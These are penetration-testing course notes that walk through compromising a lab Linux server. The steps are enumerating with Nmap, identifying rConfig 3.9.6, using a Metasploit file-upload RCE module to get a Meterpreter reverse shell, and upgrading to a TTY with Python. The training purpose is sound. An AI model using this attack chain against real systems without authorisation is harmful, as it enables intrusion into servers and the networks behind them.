# 🐧 Infiltrating Unix/Linux

> [!info]+ 🎯 Objective  
> Linux/Unix systems make up a large portion of the servers we encounter during penetration tests.
> 
> When a vulnerable Linux server hosts a web application, our goal may be to:
> 
> ```text
> 🔎 Enumerate
>      ↓
> 🌐 Identify the application
>      ↓
> 🐛 Find a vulnerability
>      ↓
> 💥 Exploit it
>      ↓
> 🐚 Gain a shell
>      ↓
> 🔀 Pivot further into the network
> ```
> 
> The important idea is that **getting a shell is often only the beginning**. Once we compromise a server, it may provide a path toward other internal systems.

---

# 🧠 1️⃣ Why Learn Unix/Linux?

A large percentage of web servers run on Unix/Linux-based systems.

For penetration testers, this makes Linux knowledge extremely valuable because compromised web servers can potentially become **pivot points** into an internal network.

```text
🌐 Public / Web Application
          │
          ▼
   🐧 Linux Web Server
          │
          │ 🐚 Gain Shell
          ▼
     👤 Compromised Host
          │
          │ 🔀 Pivot
          ▼
   🏢 Internal Network
     ┌────┴────┐
     ▼         ▼
  🖥️ Server   🌐 Network Device
```

> [!important]+ 💡 Key Concept  
> A compromised web server may have access to systems that are **not directly accessible from the attacker's machine**.
> 
> Therefore:
> 
> **Initial shell → foothold → enumeration → pivoting → further compromise**

---

# 🔍 2️⃣ Common Ways to Gain a Shell

One common method of gaining a shell is exploiting a **vulnerable application**.

The general attack chain is:

```text
🎯 Target
   │
   ▼
🔎 Enumeration
   │
   ▼
🌐 Identify Application
   │
   ▼
📌 Determine Version
   │
   ▼
🐛 Research Vulnerabilities
   │
   ▼
💥 Find Exploit
   │
   ▼
📦 Deliver Payload
   │
   ▼
🐚 Gain Shell
```

The key questions we should ask before deciding how to attack a Linux system are:

> [!question]+ ❓ Common Considerations  
> **1. What Linux distribution is running?**
> 
> **2. What shells and programming languages are available?**
> 
> **3. What function does the system serve on the network?**
> 
> **4. What application is being hosted?**
> 
> **5. Are there known vulnerabilities affecting that application?**

These questions help prevent us from blindly attacking services without understanding the target.

---

# 🛰️ 3️⃣ Initial Enumeration with Nmap

As with most engagements, we begin with enumeration.

A common starting point is:

```bash
nmap -sC -sV 10.129.201.101
```

### 🔎 What Do `-sC` and `-sV` Do?

|Option|Meaning|
|---|---|
|`-sC`|Run Nmap's default scripts|
|`-sV`|Attempt to determine service/version information|

The scan reveals:

```text
21/tcp    FTP       vsftpd
22/tcp    SSH       OpenSSH 7.4
80/tcp    HTTP      Apache 2.4.6 + PHP 7.2.34
111/tcp   RPC       rpcbind
443/tcp   HTTPS     Apache 2.4.6 + PHP 7.2.34
3306/tcp  MySQL     MySQL
```

---

# 🧩 4️⃣ Reading the Nmap Results

The scan gives us several important pieces of information.

### 🌐 Web Services

```text
80  → HTTP
443 → HTTPS
```

Both are running:

```text
Apache 2.4.6
PHP 7.2.34
CentOS
```

This strongly suggests that the machine is hosting a **web application**.

### 🗄️ Database

```text
3306 → MySQL
```

A MySQL service is also exposed.

### 📁 File Transfer

```text
21 → FTP
```

FTP is another potential attack surface.

### 🔐 Remote Access

```text
22 → SSH
```

SSH could potentially provide remote shell access if valid credentials or a vulnerability are discovered.

---

# 🧠 5️⃣ Build a Target Profile

Instead of immediately searching for random exploits, organize what we know.

```text
🎯 TARGET
│
├── 🐧 OS
│     └── CentOS
│
├── 🌐 Web
│     ├── Apache 2.4.6
│     └── PHP 7.2.34
│
├── 🔐 SSH
│     └── OpenSSH 7.4
│
├── 📁 FTP
│     └── vsftpd
│
├── 🗄️ Database
│     └── MySQL
│
└── ⚙️ RPC
      └── rpcbind
```

> [!tip]+ 🎯 Don't Go Down a Rabbit Hole Too Early  
> Seeing many services does **not** mean we should attack every service immediately.
> 
> First ask:
> 
> **"Which service gives me the most promising path toward a shell?"**
> 
> Since HTTP/HTTPS exposes a web application, investigating the application itself is a logical next step.

---

# 🌐 6️⃣ Discover the Web Application

After discovering HTTP/HTTPS, navigate to the target in a browser.

The website reveals:

## ⚙️ rConfig Management Tool

The application is **rConfig**, a network configuration management tool.

It allows administrators to automate configuration of network devices such as routers and switches.

For example:

```text
             ⚙️ rConfig
                 │
        ┌────────┼────────┐
        ▼        ▼        ▼
     Router   Switch    Router
        │        │        │
        └────────┴────────┘
             Network
```

> [!warning]+ 🚨 Why Is This Interesting?  
> A configuration-management application may have access to important network devices.
> 
> Therefore, compromising it could potentially provide access to:
> 
> - 🌐 Routers
>     
> - 🔀 Switches
>     
> - 🖥️ Network infrastructure
>     
> - 🔐 Configuration information
>     
> - 🏢 Internal systems
>     
> 
> This makes vulnerabilities in network-management software particularly valuable during an engagement.

---

# 🏷️ 7️⃣ Identify the Application Version

At the bottom of the login page, we discover:

```text
rConfig 3.9.6
```

This is extremely useful information.

Instead of searching for:

```text
rConfig vulnerability
```

we can search specifically for:

```text
rConfig 3.9.6 vulnerability
```

Or:

```text
rConfig 3.9.6 exploit
```

Or:

```text
rConfig 3.9.6 CVE
```

---

# 🐛 8️⃣ Vulnerability Research Methodology

Once we know:

```text
Application → rConfig
Version     → 3.9.6
```

we can investigate:

```text
🔎 CVEs
🔎 Public exploits
🔎 PoCs
🔎 Metasploit modules
🔎 GitHub exploit code
🔎 Security research
```

### 🧠 General Methodology

```text
Application
     │
     ▼
Version
     │
     ▼
Search:
 ├── CVE
 ├── Exploit
 ├── PoC
 └── Metasploit
     │
     ▼
Understand the exploit
     │
     ▼
Does it provide a shell?
     │
     ├── ❌ No → Continue researching
     │
     └── ✅ Yes
           │
           ▼
        Exploit
```

> [!important]+ 💡 Don't Just Copy an Exploit  
> When you find a PoC or exploit, understand:
> 
> **What vulnerability does it exploit?**
> 
> **What does the exploit actually do?**
> 
> **Does it require authentication?**
> 
> **What payload is delivered?**
> 
> **What kind of shell/session does it provide?**

---

# 🧰 9️⃣ Searching Metasploit

Metasploit can also be used to search for modules.

```text
msf6 > search rconfig
```

Example results:

```text
0  exploit/multi/http/solr_velocity_rce
1  auxiliary/gather/nuuo_cms_file_download
2  exploit/linux/http/rconfig_ajaxarchivefiles_rce
3  exploit/unix/webapp/rconfig_install_cmd_exec
```

### 🔎 How to Read This

Each result contains information such as:

|Field|Meaning|
|---|---|
|`Name`|Metasploit module path|
|`Disclosure Date`|When vulnerability was publicly disclosed|
|`Rank`|Metasploit's assessment of module reliability|
|`Check`|Whether the module supports checking vulnerability|
|`Description`|What the module does|

> [!warning]+ ⚠️ Important Metasploit Lesson  
> **`search` results are not automatically the correct exploit.**
> 
> Metasploit may return modules that contain the searched keyword but target completely different software.
> 
> For example:
> 
> ```text
> search rconfig
> ```
> 
> may return unrelated modules simply because `rconfig` appears somewhere in their metadata.
> 
> Always verify:
> 
> ```text
> Application
>      +
> Version
>      +
> Vulnerability
>      +
> Module
> ```
> 
> all match.

---

# 🧠 🔟 Metasploit Search Is Not the Entire Picture

One important limitation is the version of Metasploit installed on your system.

A useful exploit module may exist in the Metasploit Framework repository but not yet be available in your local installation.

The official Metasploit Framework source contains the exploit modules.

Therefore, if Metasploit doesn't find what we're looking for, we can also research externally:

```text
rConfig 3.9.6 exploit metasploit github
```

This can reveal modules that aren't present in the local installation.

---

# 🐙 1️⃣1️⃣ Metasploit Modules and Ruby

Metasploit modules are written in **Ruby**.

For example:

```text
rconfig_vendors_auth_file_upload_rce.rb
```

The `.rb` extension indicates a Ruby file.

The module can be placed in the appropriate Metasploit module directory if it is missing from the local installation.

Example location from the HTB environment:

```text
/usr/share/metasploit-framework/modules/exploits/linux/http
```

You can locate Metasploit-related directories with:

```bash
locate exploits
```

> [!tip]+ 🧠 Remember  
> If an exploit exists in the Metasploit Framework repository but not in your local installation:
> 
> ```text
> 🔎 Find module
>       ↓
> 📥 Obtain module
>       ↓
> 📁 Place in correct MSF directory
>       ↓
> 🔄 Reload/use module
>       ↓
> 💥 Exploit
> ```
> 
> Keeping Metasploit updated can also help ensure you have newer modules.

---

# 💥 1️⃣2️⃣ Using the rConfig Exploit

Once we identify the appropriate exploit module:

```text
exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

we can select it:

```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Then configure the required options for our environment.

The important workflow is:

```text
use
 ↓
show options
 ↓
set required values
 ↓
check
 ↓
exploit
```

---

# 🚀 1️⃣3️⃣ What the Exploit Does

The successful exploit output shows:

```text
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable.
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage ...
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened
```

This reveals the exploitation chain.

```text
🎯 rConfig 3.9.6
       │
       ▼
🔎 Vulnerability Check
       │
       ▼
🔐 Authenticate
       │
       ▼
📤 Upload PHP Payload
       │
       ▼
💥 Trigger Payload
       │
       ▼
🔄 Reverse Connection
       │
       ▼
🐱 Meterpreter Session
       │
       ▼
🗑️ Delete Payload
```

---

# 🧩 1️⃣4️⃣ Understand the Exploit, Not Just the Command

The exploit performs several important actions:

### 1️⃣ Vulnerability Check

```text
3.9.6 of rConfig found
```

The module verifies that the target appears to be running the vulnerable version.

### 2️⃣ Authentication

```text
We successfully logged in!
```

The exploit authenticates to the rConfig application.

### 3️⃣ File Upload

```text
Uploading file 'olxapybdo.php'
```

A PHP payload is uploaded.

### 4️⃣ Payload Execution

```text
Triggering the payload
```

The uploaded PHP file is accessed/executed.

### 5️⃣ Reverse Connection

```text
Sending stage...
```

The target connects back to the attack machine.

### 6️⃣ Cleanup

```text
Deleted olxapybdo.php
```

The uploaded payload is removed.

### 7️⃣ Session

```text
Meterpreter session 1 opened
```

We now have an interactive Meterpreter session.

> [!success]+ 🐚 Result  
> **Application vulnerability → payload upload → code execution → reverse connection → Meterpreter shell**

---

# 🐱 1️⃣5️⃣ Meterpreter vs System Shell

After obtaining Meterpreter:

```text
meterpreter >
```

we can interact with the session using Meterpreter commands.

For example:

```text
meterpreter > dir
```

We can also use:

```text
meterpreter > shell
```

This drops us into the underlying system shell.

```text
meterpreter
    │
    │ shell
    ▼
System Shell
    │
    ▼
Linux Commands
```

Example:

```text
Process 3958 created.
Channel 0 created.

dir
ajax-loader.gif
cisco.jpg
juniper.jpg

ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

---

# 🐚 1️⃣6️⃣ Non-TTY Shell

There is an important problem.

The shell does not provide a normal interactive prompt.

This is called a:

> [!warning]+ 🐚 Non-TTY Shell  
> A **non-TTY shell** is a shell without a proper interactive terminal interface.
> 
> It may still allow commands to execute, but functionality can be limited.

For example:

```text
❌ No normal prompt
❌ Limited terminal behavior
❌ Some interactive programs may not work correctly
❌ su/sudo may be problematic
```

This matters because privilege escalation often requires more interactive terminal functionality.

---

# 👤 1️⃣7️⃣ Why Are We the `apache` User?

The payload was executed by the web server.

Therefore, the resulting shell runs in the context of the web-server account:

```bash
whoami
```

Output:

```text
apache
```

So our access is:

```text
🌐 Apache Web Server
        │
        ▼
🐚 Shell
        │
        ▼
👤 apache
```

> [!important]+ 🧠 Key Concept  
> **The user who executes the payload determines the initial shell's privileges.**
> 
> We compromised the web application, but we did **not automatically become root**.
> 
> Our next objective in a real engagement would usually be:
> 
> ```text
> 🐚 apache
>      ↓
> 🔎 Enumerate
>      ↓
> 🔓 Find privilege-escalation path
>      ↓
> 👑 root
> ```

---

# 🐍 1️⃣8️⃣ Check for Python

One way to improve the shell is to spawn a proper TTY using Python.

First check whether Python exists:

```bash
which python
```

If Python is available, we can use its `pty` module.

---

# 🖥️ 1️⃣9️⃣ Spawn a TTY Shell with Python

Command:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### 🔎 Breaking It Down

```text
python
   │
   ▼
-c
   │
   ▼
Execute Python code
   │
   ├── import pty
   │
   └── pty.spawn("/bin/sh")
             │
             ▼
          /bin/sh
```

The Python `pty` module provides functionality for working with pseudo-terminals.

The command:

```python
pty.spawn("/bin/sh")
```

starts a Bourne shell through a pseudo-terminal.

The result is:

```text
sh-4.2$
```

instead of having no useful prompt.

Now:

```bash
sh-4.2$ whoami
apache
```

We still have the same user:

```text
apache
```

but now have a more functional shell environment.

---

# 🔄 2️⃣0️⃣ Complete Attack Chain

The entire lesson can be represented as:

```text
                         🎯 LINUX TARGET
                               │
                               ▼
                       🔎 Nmap Enumeration
                               │
                               ▼
                    🌐 Web Application Found
                               │
                               ▼
                         ⚙️ rConfig
                               │
                               ▼
                          🏷️ Version
                           3.9.6
                               │
                               ▼
                      🐛 Vulnerability Research
                               │
                ┌──────────────┴──────────────┐
                ▼                             ▼
         🔎 Public Exploit              🧰 Metasploit
                │                             │
                └──────────────┬──────────────┘
                               ▼
                     💥 rConfig Exploit
                               │
                               ▼
                     📤 PHP Payload Upload
                               │
                               ▼
                       ▶️ Payload Trigger
                               │
                               ▼
                     🔄 Reverse Connection
                               │
                               ▼
                       🐱 Meterpreter
                               │
                               ▼
                           `shell`
                               │
                               ▼
                       🐚 Non-TTY Shell
                               │
                               ▼
                      🐍 Python `pty.spawn`
                               │
                               ▼
                        🖥️ TTY Shell
                               │
                               ▼
                          👤 apache
                               │
                               ▼
                    🔎 Further Enumeration
                               │
                               ▼
                       🔓 Privilege Escalation
```

---

# 🧠 2️⃣1️⃣ The CPTS Methodology to Remember

When attacking a Linux web server, don't think:

> **"What exploit can I run?"**

Think:

```text
🔎 1. ENUMERATE
        ↓
🌐 2. IDENTIFY SERVICES
        ↓
⚙️ 3. IDENTIFY APPLICATION
        ↓
🏷️ 4. IDENTIFY VERSION
        ↓
🐛 5. RESEARCH VULNERABILITIES
        ↓
🧠 6. UNDERSTAND THE EXPLOIT
        ↓
💥 7. EXPLOIT
        ↓
🐚 8. ESTABLISH SHELL
        ↓
👤 9. IDENTIFY CURRENT USER
        ↓
🔧 10. IMPROVE SHELL
        ↓
🔎 11. ENUMERATE FURTHER
        ↓
👑 12. PRIVILEGE ESCALATION
```

> [!success]+ 🎯 CPTS Mental Model  
> **Don't start with the exploit. Start with enumeration.**
> 
> ```text
> What is running?
>       ↓
> What version?
>       ↓
> What does it do?
>       ↓
> Is it vulnerable?
>       ↓
> What exploit exists?
>       ↓
> What access does it give me?
> ```
> 
> This mindset prevents you from blindly trying random Metasploit modules.

---

# 📌 2️⃣2️⃣ Quick Reference

### 🔎 Enumeration

```bash
nmap -sC -sV <TARGET_IP>
```

### 🧰 Metasploit Search

```text
msf6 > search rconfig
```

### 🎯 Select Module

```text
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

### 🐚 Enter System Shell

```text
meterpreter > shell
```

### 🔎 Identify Current User

```bash
whoami
```

### 🐍 Check for Python

```bash
which python
```

### 🖥️ Spawn TTY

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

# 🎯 2️⃣3️⃣ Key Takeaways

- 🐧 Linux/Unix knowledge is essential because many web servers run on Unix-based systems.
    
- 🔎 **Nmap** is a strong starting point for identifying services and versions.
    
- 🌐 HTTP/HTTPS services should be investigated to identify the underlying web application.
    
- ⚙️ Identifying the **application + exact version** dramatically improves vulnerability research.
    
- 🐛 Search for **CVEs, PoCs, public exploits, and Metasploit modules**.
    
- 🧰 Metasploit's `search` function may return unrelated results, so always verify the module against the actual application and version.
    
- 🐙 Useful Metasploit modules may exist in the framework repository even if they aren't installed locally.
    
- 💥 The rConfig exploit demonstrates how a vulnerable application can lead to **remote code execution and a shell**.
    
- 🐱 Meterpreter can be used to enter the underlying system shell with `shell`.
    
- 🐚 A basic shell may be **non-TTY** and have limited functionality.
    
- 🐍 Python's `pty.spawn()` can provide a more functional TTY shell when Python is available.
    
- 👤 Initial access does not necessarily mean root access — in this example, the shell runs as **`apache`**.
    
- 🔓 After obtaining a foothold, further enumeration and **privilege escalation** are usually the next objectives.
    

> [!success]+ 🧠 Final Mental Model
> 
> ```text
> 🔎 ENUMERATE
>      ↓
> 🌐 IDENTIFY
>      ↓
> 🏷️ VERSION
>      ↓
> 🐛 RESEARCH
>      ↓
> 💥 EXPLOIT
>      ↓
> 🐚 SHELL
>      ↓
> 👤 USER
>      ↓
> 🔧 TTY
>      ↓
> 🔎 ENUMERATE AGAIN
>      ↓
> 👑 PRIVILEGE ESCALATION
> ```
> 
> **The goal isn't simply "run an exploit."**
> 
> **The goal is to understand the target well enough that you can logically move from enumeration → vulnerability → exploitation → shell → deeper access.**